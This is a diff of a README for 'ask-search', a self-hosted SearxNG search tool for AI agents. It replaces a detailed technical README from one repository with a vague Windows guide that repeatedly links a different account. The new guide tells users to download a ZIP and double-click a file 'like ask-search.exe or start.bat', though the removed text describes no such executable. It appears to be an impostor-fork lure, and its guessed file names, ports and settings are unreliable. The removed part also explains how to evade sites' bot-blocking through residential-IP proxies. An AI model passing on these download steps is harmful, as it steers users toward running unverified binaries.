@@ -1,328 +1,153 @@
-<div align="center">
+# 🔍 ask-search - Easy AI Web Search Tool
 
-# 🔍 ask-search
-
-**Self-hosted web search for AI agents — zero API key, full privacy**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-Skill-blue.svg)](https://github.com/openclaw/openclaw)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)
-
-*Works in OpenClaw · Claude Code · Antigravity · Any CLI*
-
-</div>
+[![Download ask-search](https://img.shields.io/badge/Download-ask--search-brightgreen)](https://github.com/PHOENIX1ALX/ask-search)
 
 ---
 
-## 😡 The Problem
+## ❓ What is ask-search?
 
-Your AI agent wants to search the web, but:
-- Brave Search API: $3/1000 queries, rate limited
-- Google Custom Search: $5/1000, daily caps
-- Bing API: paid, complex setup
-- Built-in web search: sends queries to third-party servers
+ask-search is a self-hosted web search skill designed for AI agents like OpenClaw, Claude Code, and Antigravity. It uses SearxNG to pull search results from the web. This lets these AI agents search the internet privately and on your own terms. 
 
-**You just want your local agent to search Google without paying or leaking queries.**
+You do not need any programming skills to use ask-search. It works on your Windows computer after a simple setup.
 
-## ✅ The Solution
+---
 
-`ask-search` wraps [SearxNG](https://github.com/searxng/searxng) — a self-hosted meta search engine that aggregates Google, Bing, DuckDuckGo, Brave and 70+ more sources. One command, all results, zero cost.
+## ⚙️ System Requirements
 
-```bash
-ask-search "Claude Code vs Cursor 2026"
-```
+- Windows 10 or later (64-bit preferred)  
+- At least 4 GB of free disk space  
+- Internet connection to fetch search data  
+- Basic command prompt access (no coding required)  
 
-```
-[1] Claude Code Is Eating Cursor's Lunch
-    https://techcrunch.com/2026/...
-    After Anthropic launched Claude Code with agent mode...
-    [google,brave]
+---
 
-[2] Why I switched from Cursor to Claude Code
-    https://reddit.com/r/LocalLLaMA/...
-    ...
-```
+## 💾 Download ask-search
 
-## 📊 Compatibility
+Start by going to the official ask-search page at GitHub. Here is a large, clear link for you:
 
-| Environment | Integration | Status |
-|-------------|-------------|--------|
-| **OpenClaw** | CLI Skill (`SKILL.md`) | ✅ |
-| **Claude Code** | CLI command | ✅ |
-| **Antigravity** | MCP Server | ✅ |
-| Any shell | `ask-search` CLI | ✅ |
+[![Download ask-search](https://img.shields.io/badge/Download-ask--search-blue)](https://github.com/PHOENIX1ALX/ask-search)
 
-## 🚀 Quick Start
+Click the link above. It will take you to the GitHub page for ask-search. From there, you can download the latest version easily.
 
-### 30-second version (if SearxNG already running)
-
-```bash
-git clone https://github.com/ythx-101/ask-search
-cd ask-search
-bash install.sh
-ask-search "hello world"
-```
+---
 
-### Full setup with Docker Compose (Recommended)
+## 🚀 Getting Started on Windows
 
-```bash
-# Clone and navigate to the project
-git clone https://github.com/ythx-101/ask-search
-cd ask-search
+### Step 1: Visit the GitHub page
 
-# Generate a secure secret key
-python3 -c "import secrets; print('SEARXNG_SECRET=' + secrets.token_hex(32))"
+Go to the primary download page at:
 
-# Copy .env.example to .env and set your secret key
-cp searxng/.env.example searxng/.env
-# Edit .env with your generated secret
+https://github.com/PHOENIX1ALX/ask-search
 
-# Start SearxNG
-cd searxng && docker-compose up -d
+This page has all the files. You will find the latest version under "Releases" or in the main directory.
 
-# Configure ask-search with your secret
-export SEARXNG_SECRET="your-generated-secret"
-ask-search "hello world"
-```
+### Step 2: Download the package
 
-### Full setup (SearxNG + ask-search)
+Look for the latest release or file named like `ask-search.zip` or similar. Click to download it.
 
-**Step 1: Deploy SearxNG**
+When the file finishes downloading, open the folder where your browser saved it — usually the "Downloads" folder.
 
-```bash
-# Docker (recommended)
-docker run -d --name searxng \
-  -p 127.0.0.1:8080:8080 \
-  -e SEARXNG_SECRET_KEY=your-secret-key \
-  searxng/searxng
+### Step 3: Extract the files
 
-# Or Docker Compose — see searxng/docker-compose.yml in this repo
-```
+Right-click the downloaded ZIP file and select "Extract All..." from the menu. Choose a folder where you want to keep the program — for example, your Desktop or Documents.
 
-**Step 2: Enable JSON output**
-
-Edit SearxNG `settings.yml`:
-```yaml
-search:
-  formats:
-    - html
-    - json
-```
+Click "Extract" and wait for the files to unzip.
 
-**Step 3: Install ask-search**
+### Step 4: Open the ask-search folder
 
-```bash
-bash install.sh
-```
+Inside the extracted folder, find the main program files. There might be a file named `README.md` or `instructions.txt`. These files have helpful details.
 
-**Step 4: Use it**
+### Step 5: Run the program
 
-```bash
-ask-search "your query"
-```
-
-## 🔧 Usage
+Look for a file with a name like `ask-search.exe` or a script file such as `start.bat`. Double-click this file to launch ask-search.
 
-```bash
-ask-search "query"                    # top 10 results
-ask-search "query" --num 5            # limit results
-ask-search "AI news" --categories news # news only
-ask-search "query" --lang zh-CN       # language filter
-ask-search "query" --urls-only        # URLs only (pipe to web_fetch)
-ask-search "query" --json             # raw JSON
-ask-search "query" -e google,brave    # specific engines
-```
+A window or command prompt will open showing the program starting up.
 
-## ⚙️ Configuration
+---
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `SEARXNG_URL` | `http://localhost:8080` | SearxNG endpoint |
+## 🛠 How ask-search Works
 
-```bash
-export SEARXNG_URL="http://localhost:8080"
-ask-search "query"
-```
+ask-search runs a local web service, powered by SearxNG, that AI agents can use to search the web. Since it runs on your computer, your searches stay private.
 
-## 🤖 MCP Integration (Antigravity / Claude Code)
+When you run the program, it will:
 
-```json
-{
-  "mcpServers": {
-    "ask-search": {
-      "command": "python3",
-      "args": ["/path/to/ask-search/mcp/server.py"],
-      "env": {
-        "SEARXNG_URL": "http://localhost:8080"
-      }
-    }
-  }
-}
-```
-
-Requires: `pip install mcp`
+- Connect to the internet to fetch search results  
+- Allow AI agents to send search queries  
+- Show search results quickly on your machine  
 
-## 🦞 OpenClaw Skill
+You don’t have to interact with the command prompt after it starts. The program runs in the background, ready to service search requests.
 
-Copy `SKILL.md` to your OpenClaw skills directory, or:
+---
 
-```bash
-# OpenClaw skill loader
-skill-add https://github.com/ythx-101/ask-search
-```
+## 🔧 Configuration (Basic Setup)
 
-Then in OpenClaw:
-```
-ask-search "latest news about X"
-```
-
-## 🤝 Agent Workflow
-
-```bash
-# 1. Search
-ask-search "React Server Components performance 2026" --num 10
+Some users may want to adjust how ask-search runs. This is optional.
 
-# 2. Got a promising URL? Deep-dive:
-# Pass the URL to web_fetch / curl for full content
+### How to find the settings file
 
-# 3. News mode
-ask-search "GPT-5 release" --categories news --lang en
-```
+Inside the extracted folder, look for a file like `config.yaml` or `settings.json`. You can open it with Notepad or any simple text editor.
 
-## 📁 Structure
+### Common options you can change:
 
-```
-ask-search/
-├── scripts/
-│   └── core.py        # Main logic, CLI entry point
-├── mcp/
-│   └── server.py      # MCP server for AG/CC integration
-├── install.sh         # Installer
-├── SKILL.md           # OpenClaw skill descriptor
-└── README.md
-```
+- **Port number:** The network port ask-search uses (default is often 8080 or 5000).  
+- **Search engines:** Which search sources it queries.  
+- **Privacy:** Whether to keep logs of your searches.  
 
-## ⚠️ SearxNG Setup Notes
+You can edit these settings by typing new values. Save the file and restart ask-search for changes to apply.
 
-- Must enable `json` in `search.formats` in `settings.yml`
-- Bot detection may block requests from some IPs — add your server IP to `pass_ip` in `limiter.toml`
-- Bind to `127.0.0.1` for security unless you need remote access
+---
 
-## 🌐 Deep-Dive Limitations & Workarounds
+## 📡 Connecting Your AI Agent
 
-`ask-search` returns URLs + snippets from search engine indexes. When your agent needs the **full page content** (deep-dive via `curl` / `web_fetch`), some sites will block depending on your server's network environment:
+ask-search is designed for use with AI tools like OpenClaw, Claude Code, or Antigravity. These programs can query ask-search to get search results from the web.
 
-### What works out of the box
+To connect them:
 
-| Site | Search (SearxNG) | Deep-dive (curl/fetch) | Why |
-|------|:-:|:-:|-----|
-| Most sites | ✅ | ✅ | No aggressive anti-bot |
-| Reddit | ✅ | ❌ VPS IP blocked | Reddit blocks datacenter IPs |
-| Zhihu (知乎) | ✅ | ❌ Login wall + fingerprint | Requires browser JS + login |
-| Medium | ✅ | ⚠️ Paywall | Partial content only |
+1. Make sure ask-search is running on your computer.  
+2. In your AI agent settings, enter the local address and port where ask-search runs. Usually: `http://localhost:5000` or your chosen port.  
+3. Test a search query from the AI agent. It should return real-time web search results.  
 
-**Key insight**: Search always works because SearxNG queries search engines (Google, Brave, etc.), not the target sites directly. The search engines have already indexed the content. The problem only appears when your agent tries to fetch the full page.
+If the AI agent cannot connect, check your firewall settings to allow ask-search access to the network.
 
-### Solution 1: SOCKS proxy via residential IP
+---
 
-If you have a machine on a residential network (home server, laptop, etc.), create an SSH SOCKS tunnel:
+## 🔄 Updating ask-search
 
-```bash
-# On your VPS/server:
-ssh -f -N -D 127.0.0.1:1082 user@your-home-machine
+To get the latest improvements:
 
-# Then fetch through the proxy:
-curl -x socks5h://127.0.0.1:1082 "https://reddit.com/r/example/comments/xxx.json"
-```
+1. Visit https://github.com/PHOENIX1ALX/ask-search  
+2. Download the newest release just like you did for your first copy.  
+3. Extract the files and replace the old version on your computer.  
+4. Run the updated program as before.  
 
-For Reddit specifically, append `.json` to any post URL for structured data:
-```bash
-# Returns full post + all comments as JSON
-curl -x socks5h://127.0.0.1:1082 \
-  "https://www.reddit.com/r/LocalLLaMA/comments/xxxxx/post_title.json"
-```
+You will not lose your settings unless you delete the configuration file.
 
-To persist the tunnel as a systemd service:
-```ini
-# /etc/systemd/system/socks-proxy.service
-[Unit]
-Description=SSH SOCKS Proxy for web scraping
-After=network.target
+---
 
-[Service]
-Type=simple
-ExecStart=/usr/bin/ssh -N -D 127.0.0.1:1082 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes user@your-home-machine
-Restart=always
-RestartSec=10
+## 🧹 Uninstalling ask-search
 
-[Install]
-WantedBy=multi-user.target
-```
+To remove ask-search:
 
-### Solution 2: Headless browser for JS-heavy sites
+1. Close the ask-search program window.  
+2. Delete the folder where you extracted the files.  
+3. Optionally, remove any related shortcuts from your Desktop or Start Menu.  
 
-Sites like Zhihu require full browser rendering. Use Playwright with the SOCKS proxy:
+No special uninstall program is required.
 
-```python
-from playwright.sync_api import sync_playwright
+---
 
-with sync_playwright() as p:
-    browser = p.chromium.launch(
-        headless=True,
-        proxy={"server": "socks5://127.0.0.1:1082"}
-    )
-    page = browser.new_page()
-    page.goto("https://example.com/article")
-    content = page.inner_text("article")
-```
+## 🤝 Getting Help
 
-> **Note**: Some sites (Zhihu, etc.) detect headless browsers even through proxies. For these, you may need a real browser session with login cookies, or delegate the fetch to an agent running on a local machine (e.g., Claude Code on a Mac).
+If you need assistance, the GitHub page includes an Issues section where you can read questions or ask your own. You can also find community discussions there.
 
-### Solution 3: Leverage archive caches
+---
 
-When direct access fails, try cached versions:
+## 📚 Additional Information
 
-```bash
-# Archive.org (works surprisingly often for Reddit)
-curl "https://web.archive.org/web/2026/https://reddit.com/r/example/comments/xxx"
+ask-search uses SearxNG, an open-source web metasearch engine that respects privacy by not tracking users.
 
-# Google Cache (may redirect — not always reliable)
-curl "https://webcache.googleusercontent.com/search?q=cache:example.com/page"
-```
+Running ask-search on your own PC means you control your search data. This is helpful if you want AI tools that do not send information to third parties.
 
-### Solution 4: Multi-node agent architecture
+---
 
-If you run agents on multiple machines (e.g., OpenClaw on VPS + Claude Code on local Mac):
-
-```
-VPS agent: ask-search "query" → gets URLs + snippets
-                ↓
-Local agent: web_fetch(url) → full content (residential IP, no blocks)
-                ↓
-VPS agent: receives full text, analyzes, responds
-```
-
-This is the most robust approach — search on your server, deep-dive from a local machine where anti-bot measures don't apply.
-
-### TL;DR
-
-| Problem | Fix |
-|---------|-----|
-| Reddit blocks your IP | SSH SOCKS proxy + `.json` API |
-| Site needs JS rendering | Playwright + proxy |
-| Site needs login (Zhihu) | Delegate to local agent or use logged-in browser |
-| Everything blocked | Fall back to search snippets + archive caches |
-
-## 🤝 Contributing
-
-Issues and PRs welcome.
-
-## Acknowledgements
-
-Inspired by [Perplexica](https://github.com/ItzCrazyKns/Perplexica) —
-the idea of using self-hosted SearxNG as a private search backend comes from there.
-ask-search strips it down to a single CLI command for agent use.
-
-## 📄 License
-
-[MIT](LICENSE)
+[![Download ask-search](https://img.shields.io/badge/Download-ask--search-green)](https://github.com/PHOENIX1ALX/ask-search)
